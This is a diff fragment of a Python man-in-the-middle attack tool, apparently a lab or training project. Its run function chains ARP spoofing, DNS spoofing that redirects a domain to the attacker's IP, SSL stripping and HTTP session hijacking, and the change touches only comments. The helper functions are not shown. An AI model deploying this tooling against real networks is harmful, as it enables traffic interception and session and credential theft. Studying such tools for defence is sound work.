@@ -50,20 +50,20 @@ def run(mode: str):
         attacker_ip = config["attacker"]["ip"]
         domain_name = config["domain"]["name"]
 
-        # --- ARP Spoofing Required for All Attacks ---
+        # ARP Spoofing required for all attackss
         if any(x in mode for x in ["arp", "dns", "ssl", "session"]):
             arp_spoofer = start_arp_spoof(victim_ip, gateway_ip, attacker_iface)
             if not arp_spoofer:
                 raise RuntimeError("ARP Spoofer failed to start.")
             running_threads["arp"] = arp_spoofer
 
-        # --- DNS Spoofing ---
+        # DNS Spoofing
         if "dns" in mode:
             dns_spoofer = DnsSpoofingAttack(domain=domain_name, fake_ip=attacker_ip)
             dns_spoofer.start()
             running_threads["dns"] = dns_spoofer
 
-        # --- SSL Stripping (not implemented yet) ---
+        # SSL stripping TBD
         if "ssl" in mode:
             real_server_ip = "10.0.0.53"
             ssl_stripper = start_sslstrip(domain=domain_name, real_ip=real_server_ip)
@@ -71,7 +71,7 @@ def run(mode: str):
                 raise RuntimeError("SSL Strip failed to start.")
             running_threads["ssl"] = ssl_stripper
 
-        # --- HTTP Session Hijacking ---
+        # HTTP Sesssion Hijacking
         if "session" in mode:
             hijacker = HTTPSessionHijacker(
                 target_domain=domain_name,
